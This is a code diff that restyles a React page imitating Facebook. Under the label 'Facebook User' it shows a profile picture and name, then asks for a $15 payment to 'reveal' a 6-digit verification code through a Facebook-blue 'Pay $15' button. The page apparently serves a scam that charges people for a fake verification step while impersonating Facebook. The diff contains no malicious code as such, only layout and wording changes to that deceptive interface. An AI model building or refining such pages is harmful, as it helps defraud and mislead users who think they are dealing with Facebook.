@@ -10,27 +10,30 @@ export default function SixDigit() {
     };
 
     return (
-        <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4 py-10 font-sans">
-            <div className="max-w-md w-full">
+        <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10 font-sans">
+            <div className="max-w-md w-full bg-[#f9fbff] border border-[#dbeafe] shadow-md rounded-xl p-6">
+                {/* User Header */}
                 <div className="flex items-center gap-4 mb-6">
                     <img
                         src={fbUser.profilePic}
                         alt="Profile"
-                        className="w-16 h-16 rounded-full border-4 border-[#1877f2] object-cover"
+                        className="w-14 h-14 rounded-full border-4 border-[#1877f2] object-cover"
                     />
                     <div>
-                        <p className="text-sm text-gray-600">Facebook User</p>
+                        <p className="text-sm text-gray-500">Facebook User</p>
                         <h2 className="text-xl font-semibold text-gray-900">{fbUser.name}</h2>
                     </div>
                 </div>
 
-                <h1 className="text-2xl font-semibold text-gray-900 mb-2">
+                {/* Title & Instructions */}
+                <h1 className="text-xl font-semibold text-[#111827] mb-2">
                     Unlock Your Verification Code
                 </h1>
-                <p className="text-gray-700 text-sm mb-6">
+                <p className="text-sm text-gray-600 mb-5">
                     A $15 payment is required to access your secure 6-digit verification code.
                 </p>
 
+                {/* Illustration */}
                 <div className="mb-6">
                     <img
                         className="rounded-md w-full"
@@ -39,6 +42,7 @@ export default function SixDigit() {
                     />
                 </div>
 
+                {/* Code Display */}
                 <div className="flex justify-between gap-2 mb-6">
                     {code.split('').map((digit, idx) => (
                         <div
@@ -50,11 +54,13 @@ export default function SixDigit() {
                     ))}
                 </div>
 
-                <button className="w-full bg-[#1877f2] text-white font-medium py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition">
+                {/* Payment Button */}
+                <button
+                    onClick={() => { }}
+                    className="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition"
+                >
                     Pay $15 to Reveal 6-Digit Code
                 </button>
-
-
             </div>
         </div>
     );
